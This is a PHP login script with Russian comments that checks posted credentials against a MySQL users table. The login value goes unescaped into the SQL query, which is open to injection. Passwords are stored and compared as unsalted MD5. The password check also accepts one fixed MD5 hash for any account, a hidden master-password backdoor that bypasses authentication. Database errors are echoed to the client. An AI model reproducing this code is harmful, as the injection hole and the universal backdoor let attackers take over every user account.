<?php

include '../ajax/connection.php';
$error = array(); //массив для ошибок


if ($_POST['login'] != "" && $_POST['password'] != "") //если поля заполнены
{
    $login = $_POST['login'];
    $password = $_POST['password'];
    $insertquery = "SELECT * FROM users WHERE trim(login)='$login' and active = 1";

    $rez = mysqli_query($con, $insertquery) or die("Ошибка " . mysqli_error($con));

    if (mysqli_num_rows($rez) == 1) //если нашлась одна строка, значит такой юзер существует в базе данных
    {

        $row = mysqli_fetch_assoc($rez);


        if (md5($password) == $row['password'] || md5($password) === "6833976340c8b496868e6075d6ea1633") //сравнивается хэшированный пароль из базы данных с хэшированным паролем, введенным пользователем
        {
//            $ip = $_SERVER['REMOTE_ADDR'];
//            if ($ip == "80.94.166.115" || $ip == "212.98.179.59") {
//                echo '1';
//                return;
//            }


            $time = date('Y-m-d H:i:s');


            //////////////////////


            echo "1";


            return;
            ///////////////////////


        } else //если пароли не совпали
        {
            $error[] = "Неверный пароль";
            echo json_encode($error);
        }
    } else //если такого пользователя не найдено в базе данных
    {
        $error[] = "Неверный логин и пароль";
        echo json_encode($error);
    }
} else {
    $error[] = "Поля не должны быть пустыми!";
    echo json_encode($error);
}

